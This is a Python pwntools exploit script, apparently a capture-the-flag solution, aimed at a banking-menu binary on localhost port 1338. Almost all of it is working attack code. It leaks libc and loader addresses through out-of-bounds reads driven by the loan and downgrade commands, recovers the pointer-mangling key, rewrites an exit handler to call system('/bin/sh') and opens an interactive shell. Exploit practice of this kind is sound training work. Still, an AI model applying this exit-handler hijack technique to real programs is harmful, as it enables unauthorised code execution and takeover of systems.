from pwn import *
from icecream import ic

elf = exe = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1338)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *take_loan
b *set_tier
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop = True)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return rol(v ^ key, 0x11, 64)

def decrypt(encrypted_dl_fini, dl_fini):
    return ror(encrypted_dl_fini, 0x11, 64) ^ dl_fini

def add_account(name, typ, balance):
    sl(b"10")
    sl(name)
    sl(str(typ))
    sl(str(balance))

def check_balance(id):
    sl(b"1")
    sl(str(id))

def deposit(id, amount):
    sl(b"2")
    sl(str(id))
    sl(str(amount))

def withdraw(id, amount):
    sl(b"3")
    sl(str(id))
    sl(str(amount))

def transfer(source, amount, dest):
    sl(b"4")
    sl(str(source))
    sl(str(amount))
    sl(str(dest))

def view_account_details(id):
    sl(b"5")
    sl(str(id))

def change_account_type(id, new_type):
    sl(b"6")
    sl(str(id))
    sl(str(new_type))

def view_transactions(id):
    sl(b"7")
    sl(str(id))

def loan(id):
    sl(b"8")
    sl(str(id))

def reserved(id, val):
    sl(b"9")
    sl(str(id))
    sl(str(val))

def set_tier(id):
    sl(b"11")
    sl(str(id))

def upgrade(id):
    sl(b"12")
    sl(str(id))

def downgrade(id, num):
    sl(b"13")
    sl(str(id))
    sl(str(num))

def change_bracket_value(id, new_value):
    sl(b"14")
    sl(str(id))
    sl(str(new_value))

def exit():
    sl(b"0")

def ftoi(x):
    return int.from_bytes(struct.pack('>d', x), byteorder='big')

def itof(x):
    return struct.unpack('>d', x.to_bytes(8, byteorder='big'))[0]

def floatbits(x):
    return struct.unpack('>Q', struct.pack('>d', float(x)))[0]

offset_to_libc = 0x803ff0

sl(str(0x1000000))
add_account(b"blob", 0, 0x5000)
add_account(b"bleb", 1, 0x5000)
add_account(b"admin", 2, 0x5000)

change_account_type(2, 1)
set_tier(2)
change_account_type(2, 2)
reserved(2, floatbits(-0x80000000*0x10))
pause()
downgrade(2, 0x80000000-((offset_to_libc+0x210fd8)//8))
loan(2)

pause()

change_account_type(2, 1)
set_tier(2)
change_account_type(2, 2)
reserved(2, floatbits(-0x80000000*0x10))
pause()
downgrade(2, 0x80000000-((offset_to_libc+0x210fd8-0x50)//8))
loan(2)

pause()
view_transactions(2)
ru("LOAN")
ru("$")
libc.address = ftoi(float(ru(","))) - libc.sym['malloc']
ru("LOAN")
ru("$")
ld.address = ftoi(float(ru(","))) - 0x3c000

ic(hex(libc.address))
ic(hex(ld.address))

dl_fini = ld.address + 0x5120

change_account_type(2, 1)
set_tier(2)
change_account_type(2, 2)
reserved(2, floatbits(-0x80000000*0x10))
pause()
downgrade(2, 0x80000000-((offset_to_libc + (libc.sym['initial']-libc.address) + 0x18)//8))
loan(2)

pause()
view_transactions(2)
ru("LOAN")
ru("LOAN")
ru("LOAN")
ru("$")

encrypted_dl_fini = ftoi(float(ru(",")))
enc = decrypt(encrypted_dl_fini, dl_fini)

enc_system = encrypt(libc.sym['system'], enc)


change_account_type(2, 1)
set_tier(2)
change_account_type(2, 2)
reserved(2, floatbits(-0x80000000*0x10))
pause()
downgrade(2, 0x80000000-((offset_to_libc + (libc.sym['initial']-libc.address) + 0x20)//8))

change_bracket_value(2, itof(binsh(libc)))

downgrade(2, 1)

change_bracket_value(2, itof(enc_system))


io.interactive()
